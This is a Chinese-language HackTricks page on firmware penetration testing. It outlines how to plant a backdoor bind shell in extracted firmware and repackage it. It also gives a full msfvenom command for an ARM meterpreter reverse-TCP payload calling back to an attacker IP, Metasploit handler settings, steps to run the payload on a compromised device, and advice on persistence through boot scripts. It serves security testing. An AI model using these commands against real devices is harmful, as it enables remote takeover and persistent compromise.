<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者想要获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>


### 此页面内容来自[https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)

尝试**上传自定义固件和/或编译的二进制文件**以查找完整性或签名验证漏洞。例如，使用以下步骤编译一个在启动时启动的后门绑定shell。

1. 使用固件修改工具（FMK）提取固件
2. 确定目标固件架构和字节序
3. 使用Buildroot构建交叉编译器，或使用适合您环境的其他方法
4. 使用交叉编译器构建后门
5. 将后门复制到提取的固件的/usr/bin目录下
6. 将适当的QEMU二进制文件复制到提取的固件的根文件系统中
7. 使用chroot和QEMU模拟后门
8. 通过netcat连接到后门
9. 从提取的固件的根文件系统中删除QEMU二进制文件
10. 使用FMK重新打包修改后的固件
11. 使用固件分析工具包（FAT）模拟带有后门IP和端口的目标固件，并使用netcat连接以测试带有后门的固件

如果已经通过动态分析、引导加载程序操作或硬件安全测试手段获得了root shell，可以尝试执行预编译的恶意二进制文件，如植入物或反向shell。考虑使用用于命令和控制（C\&C）框架的自动化负载/植入工具。例如，可以使用以下步骤利用Metasploit框架和'msfvenom'：

1. 确定目标固件架构和字节序
2. 使用`msfvenom`指定适当的目标负载（-p）、攻击者主机IP（LHOST=）、监听端口号（LPORT=）、文件类型（-f）、架构（--arch）、平台（--platform linux或windows）和输出文件（-o）。例如，`msfvenom -p linux/armle/meterpreter_reverse_tcp LHOST=192.168.1.245 LPORT=4445 -f elf -o meterpreter_reverse_tcp --arch armle --platform linux`
3. 将负载传输到受损设备（例如，运行本地web服务器并使用wget/curl将负载下载到文件系统），并确保负载具有执行权限
4. 准备Metasploit处理传入请求。例如，使用msfconsole启动Metasploit，并根据上述负载使用以下设置：use exploit/multi/handler，
* `set payload linux/armle/meterpreter_reverse_tcp`
* `set LHOST 192.168.1.245 #攻击者主机IP`
* `set LPORT 445 #可以是任何未使用的端口`
* `set ExitOnSession false`
* `exploit -j -z`
5. 在受损设备上执行meterpreter反向🐚
6. 观察meterpreter会话打开
7. 执行后渗透活动

如果可能，尝试识别启动脚本中的漏洞，以便在设备重新启动时获得持久访问权限。这种漏洞出现在启动脚本引用、[符号链接](https://www.chromium.org/chromium-os/chromiumos-design-docs/hardening-against-malicious-stateful-data)或依赖于位于不受信任的挂载位置（如SD卡和用于存储根文件系统之外数据的闪存卷）的代码时。

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者想要获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>
